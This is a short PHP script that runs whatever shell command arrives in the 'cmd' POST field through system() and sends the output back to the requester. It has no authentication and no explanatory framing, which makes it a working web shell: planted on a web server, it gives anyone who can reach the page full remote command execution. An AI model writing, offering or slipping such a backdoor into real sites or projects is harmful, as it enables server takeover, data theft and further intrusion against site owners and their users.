<?php
function execute($com)
{
	if (!empty($com))
	{
		echo system($com);
	}
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
echo $buffer;
?>